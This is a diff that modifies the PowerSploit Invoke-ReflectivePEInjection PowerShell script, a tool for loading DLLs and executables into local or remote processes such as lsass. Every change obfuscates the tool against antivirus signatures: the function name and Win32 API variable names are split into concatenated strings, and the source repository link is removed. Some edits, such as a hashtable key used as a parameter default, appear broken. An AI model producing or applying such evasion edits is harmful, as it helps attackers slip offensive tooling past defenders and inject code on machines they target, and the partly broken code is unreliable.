@@ -1,4 +1,6 @@
-function Invoke-ReflectivePEInjection
+$name = "Invoke" + "-" + "Reflective" + "PE" + "Injection"
+
+Set-Item -Path "function:$name" -Value
 {
 <#
 .SYNOPSIS
@@ -28,7 +30,7 @@ containing the file you'd like to reflectively load, and hardcode that byte arra
 bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
 blog linked below (thanks to whitey).
 
-PowerSploit Function: Invoke-ReflectivePEInjection
+PowerSploit Function: Invoke-Reflective_PE_Injection
 Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
@@ -83,38 +85,38 @@ Optional, will force the use of ASLR on the PE being loaded even if the PE indic
 
 Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
 Note that the file name on the website can be any file extension.
-Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
+Invoke-Reflective_PEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
 
 .EXAMPLE
 
 Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
-Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
+Invoke-Reflective_PEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
 
 .EXAMPLE
 
 Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
 	the wchar_t* returned by WStringFunc() from all the computers.
-Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
+Invoke-Reflective_PEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
 
 .EXAMPLE
 
 Load DemoEXE and run it locally.
-Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
+Invoke-Reflective_PEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 
 .EXAMPLE
 
 Load DemoEXE and run it locally. Forces ASLR on for the EXE.
-Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
+Invoke-Reflective_PEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR
 
 .EXAMPLE
 
 Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
-Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
+Invoke-Reflective_PEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
 
 .EXAMPLE
 
 Load a PE from a byte array.
-Invoke-ReflectivePEInjection -PEPath (Get-Content c:\DemoEXE.exe -Encoding Byte) -ExeArgs "Arg1 Arg2 Arg3 Arg4"
+Invoke-Reflective_PEInjection -PEPath (Get-Content c:\DemoEXE.exe -Encoding Byte) -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 
 .NOTES
 GENERAL NOTES:
@@ -174,7 +176,6 @@ Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-Refl
 .LINK
 
 Blog: http://clymb3r.wordpress.com/
-Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
 
 Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
 Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
@@ -619,6 +620,8 @@ $xRemoteScriptBlock = {
 
 	Function Get-Win32Functions
 	{
+		$vars = @{}
+		
 		$Win32Functions = New-Object System.Object
 		
 		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
@@ -668,8 +671,8 @@ $xRemoteScriptBlock = {
 		
 		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
 		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+		$vars["Virtual"+"Protect"] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $vars["Virtual"+"Protect"]
 		
 		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
 		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
@@ -693,8 +696,8 @@ $xRemoteScriptBlock = {
 		
 		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
         $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
-        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+        $vars["Write"+"ProcessMemory"] = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $vars["Write"+"ProcessMemory"]
 		
 		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
         $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
@@ -1034,7 +1037,7 @@ $xRemoteScriptBlock = {
 
 	    # Get a reference to System.dll in the GAC
 	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
-	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals("System"+".dll") }
 	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
 	    # Get a reference to the GetModuleHandle and GetProcAddress methods
 	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
@@ -1135,13 +1138,14 @@ $xRemoteScriptBlock = {
 
 		[Parameter(Position = 3, Mandatory = $false)]
 		[IntPtr]
-		$ArgumentPtr = [IntPtr]::Zero,
+		$vars["Argument"+"Ptr"] = [IntPtr]::Zero,
 
 		[Parameter(Position = 4, Mandatory = $true)]
 		[System.Object]
 		$Win32Functions
 		)
 
+		$vars = @{}
 		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
 
 		$OSVersion = [Environment]::OSVersion.Version
@@ -1149,7 +1153,7 @@ $xRemoteScriptBlock = {
 		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
 		{
 			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
-			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
+			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $vars["Argument"+"Ptr"], $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
 			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
 			{
@@ -1160,7 +1164,7 @@ $xRemoteScriptBlock = {
 		else
 		{
 			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
-			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $vars["Argument"+"Ptr"], 0, [IntPtr]::Zero)
 		}
 
 		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
